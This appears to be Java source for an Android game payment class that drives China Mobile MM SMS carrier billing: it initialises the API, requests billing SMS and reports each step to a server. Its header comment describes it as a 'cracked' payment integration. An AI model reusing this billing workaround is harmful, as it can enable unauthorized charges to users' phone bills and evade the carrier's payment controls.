package mobi.zty.pay.sdk.ananFee;

import java.util.HashMap;
import java.util.Map;

import mm.api.MMApiException;
import mm.api.SMSResponse;
import mm.api.android.MMApi;
import mobi.zty.pay.sdk.PayConfig;
import mobi.zty.pay.sdk.PayResultInfo;
import mobi.zty.pay.sdk.PaymentInterf;
import mobi.zty.sdk.game.Constants;
import mobi.zty.sdk.game.GameSDK;
import mobi.zty.sdk.game.bean.FeeInfo;
import mobi.zty.sdk.game.bean.MkInfo;
import mobi.zty.sdk.util.Helper;
import mobi.zty.sdk.util.Util_G;
import android.app.Activity;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.Message;

/**
 * mm网络破解支付管理类
 * @author Administrator
 *
 */
public class AnAnFeeInstance extends PaymentInterf{
	private static AnAnFeeInstance instance;
	private Handler callBHandler = null;
	private Map<Integer, SMSResponse> mapSmsResponse = new HashMap<Integer, SMSResponse>();
	private String payCode;
	private Map<String, Boolean> appKeyInitMap = new HashMap<String, Boolean>();
	public static AnAnFeeInstance getInstance(){
		if(instance==null){
			instance = scyMMpay();
		}
		return instance;
	}
	private static synchronized AnAnFeeInstance scyMMpay(){
		if(instance==null){
			instance =  new AnAnFeeInstance();
		}
		return instance;
	}
	@Override
	public void init(final Context context, Object... parameters) {
		callBHandler = (Handler) parameters[0];
		MkInfo info = (MkInfo) parameters[1];
		final String appKey = info.spKey;
		final String channelId = info.spChannel;
		new Thread(new Runnable() {

			@Override
			public void run() {
				try {
					MMApi.appStart((Activity) context, appKey, channelId);
					appKeyInitMap.put(appKey, true);
					Util_G.debugE("init", "an init succ!");
				} catch (MMApiException e) {
					appKeyInitMap.put(appKey, false);
					e.printStackTrace();
				}
			}
		}).start();

	}
	
	/**
	 * 支付结果通知 
	 * @param type 1成功
	 */
	@Override
	public void notifyPay(Object... parameters){
		int type = (Integer) parameters[0];
		int feeIndex = 0;
		if (parameters.length>1) {
			feeIndex =  (Integer) parameters[1];
		}
		SMSResponse response = mapSmsResponse.get(feeIndex);
		if (response == null) return;
		switch (type) {
		case 1://支付成功
			response.sendMessageSuccess();
			Helper.sendPayMessageToServer(PayConfig.ANAN_FEE, "通知anan支付成功!", 0);
			break;
		default://支付失败
			response.sendMessageFailed();
			Helper.sendPayMessageToServer(PayConfig.ANAN_FEE, "通知anan支付失败!", 0);
			break;
		}
		mapSmsResponse.remove(feeIndex);
		super.notifyPay(type);
	}

	@Override
	public void pay(final Context context, Object... parameters) {
		final String exData = (String) parameters[0];
		final int feeIndex = (Integer) parameters[1];
		final FeeInfo feeInfo = (FeeInfo) parameters[2];
		final MkInfo mkInfo = (MkInfo) parameters[3];
		final String appKey = mkInfo.spKey;
		final String channelId = mkInfo.spChannel;
		Helper.sendPayMessageToServer(PayConfig.ANAN_FEE, "进入支付", feeIndex);
		if (!(appKeyInitMap.containsKey(appKey)&&appKeyInitMap.get(appKey))) {
			Helper.sendPayMessageToServer(PayConfig.ANAN_FEE, "另一套计费需要重新初始化", feeIndex);
			new Thread(new Runnable() {
				@Override
				public void run() {
					try {
						MMApi.appStart((Activity) context, appKey, channelId);
						appKeyInitMap.put(appKey, true);
						Util_G.debugE("init", "an init succ!");
						Helper.sendPayMessageToServer(PayConfig.ANAN_FEE, "初始化成功"+appKey, feeIndex);
						realyPay(context, exData, feeIndex, feeInfo, mkInfo, appKey, channelId);
					} catch (MMApiException e) {
						Helper.sendPayMessageToServer(PayConfig.ANAN_FEE, "初始化失败"+e.getMessage(), feeIndex);
						appKeyInitMap.put(appKey, false);
						notiFyInitFalse();
						e.printStackTrace();
					}
				}
			}).start();
		}else{
			realyPay(context, exData, feeIndex, feeInfo, mkInfo, appKey, channelId);
		}
		
	}
	private void notiFyInitFalse() {
		PayResultInfo info = new PayResultInfo();
		info.resutCode = PayConfig.SP_INIT_FAIL;
		info.retMsg = "anan初始化失败";
		Message message = callBHandler.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
		message.obj = info;
		message.sendToTarget();
	}
	private void realyPay(final Context context, final String exData,
			final int feeIndex, FeeInfo feeInfo, MkInfo mkInfo,
			final String appKey, final String channelId) {
		payCode = feeInfo.payCode;
		final String appID = mkInfo.appId;
		Util_G.debugE("AnAnFeeInstance", "appkey:"+appKey+",paycode"+payCode+",channelId"+channelId+",appid"+appID+"");
		payCode=String.format("%s%02d", appID,Integer.parseInt(payCode));
		Helper.sendPayMessageToServer(PayConfig.ANAN_FEE, "参数没问题执行支付payCode="+payCode+"appkey="
		+appKey+"channelId="+channelId, feeIndex);
		new Thread(new Runnable() {
			@Override
			public void run() {
				PayResultInfo info = new PayResultInfo();
				info.index = feeIndex;
				try {
					SMSResponse response = MMApi.getSms(context, appKey, Long.parseLong(payCode), channelId, exData);
					mapSmsResponse.put(feeIndex, response);
					if (!response.isMustSend()) {
			        	info.resutCode = PayConfig.BIIL_SUCC;
						info.retMsg = "强联网没必要发送短信 视为成功";
						Message message = callBHandler.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
						message.obj = info;
						message.sendToTarget();
						Helper.sendPayMessageToServer(PayConfig.ANAN_FEE, info.retMsg, feeIndex);
						notifyPay(1,feeIndex);
					}else{
						Intent itSend = new Intent("SENT_SMS_ACTION");  
						itSend.putExtra("fee_index", feeIndex);
				        PendingIntent mSendPI = PendingIntent.getBroadcast(context.getApplicationContext(), 0, itSend, PendingIntent.FLAG_ONE_SHOT);//这里requestCode和flag的设置很重要，影响数据KEY_PHONENUM的传递。   
				        response.requestSendMessage(mSendPI, null);
				        Helper.sendPayMessageToServer(PayConfig.ANAN_FEE, "发送短start", feeIndex);
					}
			        
				} catch (Exception e) {
					info.resutCode = PayConfig.SP_PAY_EXPTION;
					info.retMsg = "代码提供方 sdk执行支付逻辑时 抛异常";
					Message message = callBHandler.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
					message.obj = info;
					message.sendToTarget();
					Helper.sendPayMessageToServer(PayConfig.ANAN_FEE, info.retMsg, feeIndex);
					e.printStackTrace();
				}
			}
		}).start();
	}
}
